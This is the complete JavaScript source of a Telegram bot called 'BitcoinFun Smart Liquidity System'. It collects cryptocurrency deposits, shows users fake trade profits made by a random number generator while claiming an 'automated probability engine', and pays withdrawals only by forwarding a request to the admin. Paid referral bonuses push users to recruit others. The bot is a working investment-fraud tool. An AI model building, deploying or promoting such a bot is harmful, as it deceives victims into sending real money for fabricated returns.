require("dotenv").config();
const { Telegraf, Markup, session } = require("telegraf");
const express = require("express");
const admin = require("firebase-admin");

const app = express();
const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
const ADMIN_ID = String(process.env.ADMIN_ID);
const BEP20_ADDRESS = process.env.BEP20_ADDRESS;

// ================= FIREBASE INIT =================
admin.initializeApp({
  credential: admin.credential.cert(JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT)),
});
const db = admin.firestore();
const users = db.collection("users");

// ================= MIDDLEWARE =================
bot.use(session());

// ================= HELPERS =================
const userRef = (uid) => users.doc(uid);

async function getUser(uid, username) {
  const ref = userRef(uid);
  const snap = await ref.get();
  if (!snap.exists) {
    const data = {
      userId: uid,
      username: username || "",
      balance: 0,
      deposited: 0,
      referrals: 0,
      lastTrade: 0,
      tradesToday: 0,
      lastTradeDay: new Date().toDateString(),
    };
    await ref.set(data);
    return data;
  }
  return snap.data();
}

function resetDaily(user) {
  const today = new Date().toDateString();
  if (user.lastTradeDay !== today) {
    user.tradesToday = 0;
    user.lastTradeDay = today;
  }
  return user;
}

// ================= START =================
bot.start(async (ctx) => {
  const uid = String(ctx.from.id);
  const refId = ctx.startPayload;
  let user = await getUser(uid, ctx.from.username);
  user = resetDaily(user);

  // referral
  if (refId && refId !== uid) {
    const refRef = userRef(refId);
    const refSnap = await refRef.get();
    if (refSnap.exists) {
      await refRef.update({
        referrals: admin.firestore.FieldValue.increment(1),
        balance: admin.firestore.FieldValue.increment(10),
      });
      await bot.telegram.sendMessage(
        refId,
        "🎉 *Referral Bonus!* You earned *$10*",
        { parse_mode: "Markdown" }
      );
    }
  }

  await userRef(uid).set(user, { merge: true });

  return ctx.replyWithMarkdown(
    "🚀 *BitcoinFun™ Smart Liquidity System*\n\n" +
      "⚡ Institutional-grade execution\n" +
      "🌊 Smart liquidity pooling\n" +
      "🤖 Automated probability engine (LIVE)\n\n" +
      "💰 *Minimum Capital:* `$35`\n" +
      "⏱ 2 trades / day • 💸 Withdraw anytime\n\n" +
      "🔒 Secure • Fast • Exclusive\n\n" +
      "_Choose an action below_",
    Markup.inlineKeyboard([
      [Markup.button.callback("➕ ADD CAPITAL", "deposit")],
      [
        Markup.button.callback("📈 SMART TRADE", "trade_menu"),
        Markup.button.callback("💳 WITHDRAW", "withdraw"),
      ],
      [
        Markup.button.callback("📊 STATS", "stats"),
        Markup.button.callback("🤝 REFERRAL", "refer"),
      ],
      [Markup.button.callback("🛠 SUPPORT", "support_chat")],
    ])
  );
});

// ================= DEPOSIT =================
bot.action("deposit", async (ctx) => {
  return ctx.replyWithMarkdown(
    "💳 *CAPITAL DEPOSIT*\n\n" +
      `📍 Address (BEP20):\n\`${BEP20_ADDRESS}\`\n\n` +
      "➡️ *Minimum:* `$35`\n\n" +
      "_Send funds and then upload screenshot_",
    Markup.inlineKeyboard([
      [Markup.button.callback("📩 I HAVE SENT", "send_ss")],
    ])
  );
});

bot.action("send_ss", async (ctx) => {
  ctx.session.waitingForSS = true;
  return ctx.reply("📸 Upload payment screenshot now:");
});

bot.on(["photo", "document"], async (ctx) => {
  if (!ctx.session?.waitingForSS) return;
  ctx.session.waitingForSS = false;

  const uid = String(ctx.from.id);
  const fileId = ctx.message.photo
    ? ctx.message.photo.slice(-1)[0].file_id
    : ctx.message.document.file_id;

  await bot.telegram.sendPhoto(ADMIN_ID, fileId, {
    caption:
      `💰 *DEPOSIT REQUEST*\n\n` +
      `👤 @${ctx.from.username || "user"}\n` +
      `🆔 ${uid}`,
    parse_mode: "Markdown",
    ...Markup.inlineKeyboard([
      [Markup.button.callback("✅ APPROVE $35", `approve_${uid}_35`)],
    ]),
  });

  return ctx.reply("⏳ Deposit submitted. Awaiting admin approval.");
});

bot.action(/approve_(\d+)_(\d+)/, async (ctx) => {
  const [, uid, amt] = ctx.match;
  await userRef(uid).update({
    balance: admin.firestore.FieldValue.increment(Number(amt)),
    deposited: admin.firestore.FieldValue.increment(Number(amt)),
  });
  await bot.telegram.sendMessage(uid, `🎉 *Deposit Approved!* +$${amt}`, {
    parse_mode: "Markdown",
  });
  return ctx.editMessageCaption("✅ Approved");
});

// ================= TRADE =================
bot.action("trade_menu", async (ctx) => {
  return ctx.reply(
    "📈 *Choose Direction*",
    Markup.inlineKeyboard([
      [
        Markup.button.callback("🟢 UP", "trade_up"),
        Markup.button.callback("🔴 DOWN", "trade_down"),
      ],
    ])
  );
});

bot.action(["trade_up", "trade_down"], async (ctx) => {
  const uid = String(ctx.from.id);
  const ref = userRef(uid);
  let user = (await ref.get()).data();
  user = resetDaily(user);

  // lock if no deposit
  if (user.deposited < 35) {
    return ctx.reply(
      "🚫 *Trading Locked*\n\nActivate with minimum *$35* deposit.",
      { parse_mode: "Markdown" }
    );
  }

  // 12h cooldown & 2/day
  const now = Date.now();
  if (user.tradesToday >= 2 && now - user.lastTrade < 12 * 60 * 60 * 1000) {
    return ctx.reply("⏳ Cooldown active. Try later.");
  }

  await ref.update({
    lastTrade: now,
    tradesToday: admin.firestore.FieldValue.increment(1),
    lastTradeDay: new Date().toDateString(),
  });

  await ctx.reply("🔄 Pooling liquidity...");
  setTimeout(async () => {
    const profit = Math.floor(Math.random() * 8) + 1;
    await ref.update({
      balance: admin.firestore.FieldValue.increment(profit),
    });
    await ctx.replyWithMarkdown(
      `🎉 *Trade Result*\nProfit: *+$${profit}*`
    );
  }, 15000);
});

// ================= WITHDRAW =================
bot.action("withdraw", async (ctx) => {
  const uid = String(ctx.from.id);
  const user = (await userRef(uid).get()).data();
  if (user.balance < 30) {
    return ctx.reply("❌ Minimum withdrawal is $30.");
  }
  ctx.session.wd_step = "amount";
  return ctx.reply("💸 Enter amount to withdraw:");
});

bot.on("text", async (ctx) => {
  const uid = String(ctx.from.id);
  const userSnap = await userRef(uid).get();
  if (!userSnap.exists) return;
  const user = userSnap.data();

  // Support
  if (ctx.session?.waitingForSupport) {
    ctx.session.waitingForSupport = false;
    await bot.telegram.sendMessage(
      ADMIN_ID,
      `🆘 *Support Ticket*\n\n👤 @${ctx.from.username}\n🆔 ${uid}\n\n${ctx.message.text}`,
      { parse_mode: "Markdown" }
    );
    return ctx.reply("✅ Support ticket sent.");
  }

  // Withdraw flow
  if (ctx.session?.wd_step === "amount") {
    const amt = Number(ctx.message.text);
    if (isNaN(amt) || amt < 30 || amt > user.deposited) {
      return ctx.reply("❌ Invalid amount.");
    }
    ctx.session.wd_amt = amt;
    ctx.session.wd_step = "address";
    return ctx.reply("📍 Enter BEP20 address:");
  }

  if (ctx.session?.wd_step === "address") {
    const addr = ctx.message.text;
    const amt = ctx.session.wd_amt;
    ctx.session.wd_step = null;

    await bot.telegram.sendMessage(
      ADMIN_ID,
      `💸 *WITHDRAW REQUEST*\n\n👤 @${ctx.from.username}\n🆔 ${uid}\n💰 $${amt}\n📍 ${addr}`,
      { parse_mode: "Markdown" }
    );
    return ctx.reply("⏳ Withdrawal request sent to admin.");
  }
});

// ================= SUPPORT =================
bot.action("support_chat", async (ctx) => {
  ctx.session.waitingForSupport = true;
  return ctx.reply("📝 Type your message for Admin:");
});

// ================= REFERRAL =================
bot.action("refer", async (ctx) => {
  const me = await bot.telegram.getMe();
  const link = `https://t.me/${me.username}?start=${ctx.from.id}`;
  return ctx.replyWithMarkdown(
    "🤝 *Referral Program*\n\n" +
      "Invite friends & earn *$10* per invite.\n\n" +
      `🔗 ${link}`
  );
});

// ================= STATS =================
bot.action("stats", async (ctx) => {
  const user = (await userRef(String(ctx.from.id)).get()).data();
  return ctx.replyWithMarkdown(
    `📊 *Your Stats*\n\n` +
      `💰 Balance: $${user.balance}\n` +
      `💎 Deposited: $${user.deposited}\n` +
      `👥 Referrals: ${user.referrals}`
  );
});

// ================= SERVER =================
app.get("/", (req, res) => res.send("BitcoinFun LIVE"));
app.listen(process.env.PORT || 3000, "0.0.0.0");
bot.launch().then(() => console.log("🚀 BitcoinFun Bot LIVE"));